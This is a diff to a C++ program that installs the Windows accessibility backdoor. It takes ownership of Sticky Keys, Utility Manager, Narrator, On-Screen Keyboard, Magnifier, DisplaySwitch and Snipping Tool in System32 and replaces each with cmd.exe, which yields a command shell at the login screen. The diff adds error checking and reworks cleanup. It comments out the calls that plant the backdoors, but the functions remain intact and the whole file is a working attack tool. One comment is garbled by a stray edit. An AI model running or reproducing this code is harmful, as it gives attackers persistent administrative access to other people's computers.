@@ -4,39 +4,45 @@
 #include <vector>
 #include <string>
 
+void error_handling(int status, const std::string& command) {
+    if (status != 0) {
+        std::cout << "Error Running Command: " << command << std::endl;
+    }
+}
+
 void priv_esc() {
     //grants administrative permissions to sethc.exe (Sticky Keys)
-    system("takeown /f C:\\Windows\\System32\\sethc.exe");
-    system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\sethc.exe"), "takeown /f C:\\Windows\\System32\\sethc.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");
 
     //grants administrative permissions to utilman.exe (Utility Manager)
-    system("takeown /f C:\\Windows\\System32\\utilman.exe");
-    system("icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\utilman.exe"), "takeown /f C:\\Windows\\System32\\utilman.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F");
 
     //grants administrative permissions to narrator.exe (Narrator)
-    system("takeown /f C:\\Windows\\System32\\narrator.exe");
-    system("icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\narrator.exe"), "takeown /f C:\\Windows\\System32\\narrator.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F");
 
     //grants administrative permissions to osk.exe (On Screen Keyboard)
-    system("takeown /f C:\\Windows\\System32\\osk.exe");
-    system("icacls C:\\Windows\\System32\\osk.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\osk.exe"), "takeown /f C:\\Windows\\System32\\osk.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\osk.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\osk.exe /grant administrators:F");
 
     //grants administrative permissions to sethc.exe (Magnifier)
-    system("takeown /f C:\\Windows\\System32\\magnify.exe");
-    system("icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\magnify.exe"), "takeown /f C:\\Windows\\System32\\magnify.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F");
 
     //grants administrative permissions to displayswitch.exe (Display)
-    system("takeown /f C:\\Windows\\System32\\displayswitch.exe");
-    system("icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\displayswitch.exe"), "takeown /f C:\\Windows\\System32\\displayswitch.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F");
 
     //grants administrative permissions to snippingtool.exe (Snipping Tool)
-    system("takeown /f C:\\Windows\\System32\\snippingtool.exe");
-    system("icacls C:\\Windows\\System32\\snippingtool.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\snippingtool.exe"), "takeown /f C:\\Windows\\System32\\snippingtool.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\snippingtool.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\snippingtool.exe /grant administrators:F");
 }
 
 void cleanup() {
     //searches through system32 to find previously-run backdoors
-    system("dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt");
+    error_handling(system("dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt"), "dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt");
     std::vector<std::string> replacedExecutables;
     std::ifstream file("C:\\Windows\\System32\\old_files.txt");
     std::string line;
@@ -47,77 +53,66 @@ void cleanup() {
     }
     file.close();
 
-    //list of original executable files replaced with cmd.exe
-    std::vector<std::string> backdoorList = {
-        "C:\\Windows\\System32\\sethc.exe",
-        "C:\\Windows\\System32\\utilman.exe",
-        "C:\\Windows\\System32\\narrator.exe",
-        "C:\\Windows\\System32\\osk.exe",
-        "C:\\Windows\\System32\\magnify.exe",
-        "C:\\Windows\\System32\\displayswitch.exe",
-        "C:\\Windows\\System32\\snippingtool.exe"
-    };
-
-    //deletes backdoor executables (cmd.exe replacements)
-    for (const std::string& backdoor : backdoorList) {
-        std::string delCommand = "del " + backdoor;
-        std::cout << delCommand << std::endl;
-        system(delCommand.c_str());
-    }    
-
     //restores original executables by renaming old-* files back to their original names
+    //also deletes previous backdoor executables
     for (const std::string& executable : replacedExecutables) {
         std::string original = executable;
         original.replace(executable.find("old-"), 4, "");
+        //deletes previous backdoors
+        std::string delCommand = "del " + original;
+        std::cout << delCommand << std::endl;
+        error_handling(system(delCommand.c_str()), delCommand.c_str());
+        //restores original executables
         std::string renameCommand = "move \"" + executable + "\" \"" + original + "\"";
         std::cout << renameCommand << std::endl;
-        system(renameCommand.c_str());
+        error_handling(system(renameCommand.c_str()), renameCommand.c_str());
     }
 }
 
 void sticky_keys() {
     //makes sure that sticky keys is turned on
-    system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f");
+    error_handling(system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f"), 
+    "reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f");
     
     //replaces sethc.exe with cmd.exe
-    system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
-    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
+    error_handling(system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe"), "rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
 }
 
 void utility_manager() {
     //replaces utilman.exe with cmd.exe
-    system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe");
-    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
+    error_handling(system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe"), "rename C:\\Windows\\System32\\utilman.exe old-utilman.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
 }
 
 void narrator() {
     //replaces narrator.exe with cmd.exe
-    system("rename C:\\Windows\\System32\\narrator.exe old-narrator.exe");
-    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe");
+    error_handling(system("rename C:\\Windows\\System32\\narrator.exe old-narrator.exe"), "rename C:\\Windows\\System32\\narrator.exe old-narrator.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe");
 }
 
 void on_screen_keyboard() {
     //replaces osk.exe with cmd.exe
-    system("rename C:\\Windows\\System32\\osk.exe old-osk.exe");
-    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
+    error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe"), "rename C:\\Windows\\System32\\osk.exe old-osk.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
 }
 
 void magnifier() {
     //replaces magnify.exe with cmd.exe
-    system("rename C:\\Windows\\System32\\magnify.exe old-magnify.exe");
-    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
+    error_handling(system("rename C:\\Windows\\System32\\magnify.exe old-magnify.exe"), "rename C:\\Windows\\System32\\magnify.exe old-magnify.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
 }
 
 void display_switch() {
     //replaces displayswitch.exe with cmd.exe
-    system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe");
-    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe");
+    error_handling(system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe"), "rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe");
 }
 
 void snipping_tool() {
     //replaces snippingtool.exe with cmd.exe
-    system("rename C:\\Windows\\System32\\snippingtool.exe old-snippingtool.exe");
-    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe");
+    error_handling(system("rename C:\\Windows\\System32\\snippingtool.exe old-snippingtool.exe"), "rename C:\\Windows\\System32\\snippingtool.exe old-snippingtool.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe");
 }
 
 int main(){
@@ -125,21 +120,22 @@ int main(){
     std::cout << "Gaining Permissions..." << std::endl;
     priv_esc();
 
-    //enables all windows hotkeys on the system
-    system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f");
+    //enables all windows hotkeys on the error_handling(system
+    error_handling(system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f"), 
+    "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f");
 
     //cleans up previous runs beforehand
     std::cout << "Cleaning Up..." << std::endl;
     cleanup();
 
     //executes backdoors
-    std::cout << "Executing Backdoors..." << std::endl;
-    sticky_keys();
-    utility_manager();
-    narrator();
-    on_screen_keyboard();
-    magnifier();
-    display_switch();
-    snipping_tool();
+    // std::cout << "Executing Backdoors..." << std::endl;
+    // sticky_keys();
+    // utility_manager();
+    // narrator();
+    // on_screen_keyboard();
+    // magnifier();
+    // display_switch();
+    // snipping_tool();
     return 0;
 }
